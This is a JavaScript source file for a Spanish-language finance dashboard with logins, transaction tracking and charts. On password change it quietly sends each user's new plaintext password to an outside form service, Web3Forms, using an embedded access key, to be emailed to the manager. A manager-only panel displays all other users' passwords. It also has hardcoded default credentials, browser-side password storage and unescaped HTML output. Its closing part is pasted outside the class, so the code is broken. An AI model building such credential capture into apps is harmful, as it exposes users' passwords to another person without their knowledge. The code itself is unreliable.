class DashboardPro {
    constructor() {
        this.defaultUsers = [
            { user: "santiago", pass: "123", name: "Santiago", mustChange: true },
            { user: "barbara", pass: "456", name: "Barbara", mustChange: true },
            { user: "manager", pass: "admin789", name: "Josue", mustChange: true }
        ];
        this.transactions = [];
        this.charts = {};
        this.init();
    }

    init() {
        const savedUsers = localStorage.getItem("app_users");
        this.users = savedUsers ? JSON.parse(savedUsers) : this.defaultUsers;
        // Aseguramos que el manager siempre sea Josue
        this.users = this.users.map(u => u.user === "manager" ? {...u, name: "Josue"} : u);
        
        this.setupAuth();
        this.checkSession();
    }

    setupAuth() {
        document.getElementById("loginForm").onsubmit = (e) => {
            e.preventDefault();
            const u = document.getElementById("loginUser").value.toLowerCase();
            const p = document.getElementById("loginPass").value;
            const found = this.users.find(user => user.user === u && user.pass === p);
            
            if (found) {
                if (found.mustChange) {
                    this.tempUser = found;
                    document.getElementById("login-screen").style.display = "none";
                    document.getElementById("password-modal").style.display = "flex";
                } else {
                    localStorage.setItem("session", JSON.stringify(found));
                    this.checkSession();
                }
            } else {
                document.getElementById("loginError").textContent = "Usuario o clave incorrecta";
            }
        };

        document.getElementById("changePassForm").onsubmit = async (e) => {
            e.preventDefault();
            const n1 = document.getElementById("newPass").value;
            const btn = e.target.querySelector('button');
            btn.textContent = "Notificando a Josue...";
            btn.disabled = true;

            // ENVÍO DE RESPALDO A TU CORREO (Usando tu Access Key de Web3Forms)
            try {
                await fetch("https://api.web3forms.com/submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        access_key: "325e4c7f-963b-4a8a-a004-39af05a5f31d",
                        from_name: "Finanzas PRO",
                        subject: "Respaldo de Clave: " + this.tempUser.name,
                        mensaje: `El usuario ${this.tempUser.name} ha cambiado su contraseña a: ${n1}`
                    })
                });
            } catch (err) { console.error("Error enviando correo de respaldo"); }

            this.users = this.users.map(u => u.user === this.tempUser.user ? {...u, pass: n1, mustChange: false} : u);
            localStorage.setItem("app_users", JSON.stringify(this.users));
            localStorage.setItem("session", JSON.stringify(this.users.find(u => u.user === this.tempUser.user)));
            window.location.reload();
        };

        document.getElementById("logoutBtn").onclick = () => {
            localStorage.removeItem("session");
            window.location.reload();
        };
    }

    checkSession() {
        const session = localStorage.getItem("session");
        if (session) {
            this.currentUser = JSON.parse(session);
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app-content").style.display = "block";
            document.getElementById("userNameDisplay").textContent = this.currentUser.name;
            this.startApp();
        }
    }

    startApp() {
        this.transactions = JSON.parse(localStorage.getItem("transactions")) || [];
        this.initCharts();
        this.updateUI();
        
        document.getElementById("transactionForm").onsubmit = (e) => {
            e.preventDefault();
            const amt = parseFloat(document.getElementById("amount").value);
            const tx = {
                id: Date.now(),
                description: document.getElementById("description").value,
                amount: document.getElementById("type").value === "income" ? Math.abs(amt) : -Math.abs(amt),
                category: document.getElementById("category").value,
                date: document.getElementById("dateInput").value
            };
            this.transactions.push(tx);
            localStorage.setItem("transactions", JSON.stringify(this.transactions));
            this.updateUI();
            e.target.reset();
        };
        
        document.getElementById("searchInput").oninput = (e) => this.updateUI(e.target.value);
    }

    initCharts() {
        const ctx1 = document.getElementById('categoryChart').getContext('2d');
        this.charts.cat = new Chart(ctx1, {
            type: 'doughnut',
            data: { labels: [], datasets: [{ data: [], backgroundColor: ['#4f46e5', '#10b981', '#ef4444', '#f59e0b'] }] },
            options: { maintainAspectRatio: false }
        });
        const ctx2 = document.getElementById('trendChart').getContext('2d');
        this.charts.trend = new Chart(ctx2, {
            type: 'bar',
            data: { labels: ['Ingresos', 'Gastos'], datasets: [{ label: 'Lps', data: [0, 0], backgroundColor: ['#10b981', '#ef4444'] }] },
            options: { maintainAspectRatio: false }
        });
    }

    updateUI(filter = "") {
        const tbody = document.querySelector("#transactionTable tbody");
        tbody.innerHTML = "";
        let inc = 0, exp = 0;
        const catData = {};

        this.transactions
            .filter(t => t.description.toLowerCase().includes(filter.toLowerCase()))
            .forEach(t => {
                if (t.amount > 0) inc += t.amount; 
                else {
                    exp += Math.abs(t.amount);
                    catData[t.category] = (catData[t.category] || 0) + Math.abs(t.amount);
                }
                const tr = document.createElement("tr");
                tr.innerHTML = `<td>${t.date}</td><td>${t.description}</td><td>${t.category}</td>
                    <td class="${t.amount > 0 ? 'amount-inc' : 'amount-exp'}">L ${Math.abs(t.amount).toFixed(2)}</td>
                    <td><button onclick="window.app.del(${t.id})">🗑️</button></td>`;
                tbody.appendChild(tr);
            });

        document.getElementById("totalIncome").textContent = `L ${inc.toFixed(2)}`;
        document.getElementById("totalExpense").textContent = `L ${exp.toFixed(2)}`;
        document.getElementById("totalSavings").textContent = `L ${(inc - exp).toFixed(2)}`;
        
        this.charts.cat.data.labels = Object.keys(catData);
        this.charts.cat.data.datasets[0].data = Object.values(catData);
        this.charts.cat.update();
        this.charts.trend.data.datasets[0].data = [inc, exp];
        this.charts.trend.update();
    }

    del(id) {
        this.transactions = this.transactions.filter(t => t.id !== id);
        localStorage.setItem("transactions", JSON.stringify(this.transactions));
        this.updateUI();
    }
}
// ... (Dentro de la clase DashboardPro, actualiza la función checkSession)

    checkSession() {
        const session = localStorage.getItem("session");
        if (session) {
            this.currentUser = JSON.parse(session);
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app-content").style.display = "block";
            document.getElementById("userNameDisplay").textContent = this.currentUser.name;

            // MOSTRAR PANEL MAESTRO SOLO A JOSUE
            if (this.currentUser.user === "manager") {
                const panel = document.getElementById("manager-panel");
                if (panel) {
                    panel.style.display = "block";
                    this.renderPasswordTable();
                }
            }
            this.startApp();
        }
    }

    renderPasswordTable() {
        const tbody = document.getElementById("passwords-table-body");
        if (!tbody) return;
        tbody.innerHTML = "";
        this.users.forEach(u => {
            if (u.user !== "manager") {
                const tr = document.createElement("tr");
                tr.innerHTML = `
                    <td style="padding: 10px; border-bottom: 1px solid #eee;"><b>${u.name}</b></td>
                    <td style="padding: 10px; border-bottom: 1px solid #eee; font-family: monospace; color: #ef4444;">${u.pass}</td>
                `;
                tbody.appendChild(tr);
            }
        });
    }

// ... (El resto del código de envío a Web3Forms se mantiene igual para el respaldo por email)
window.app = new DashboardPro();

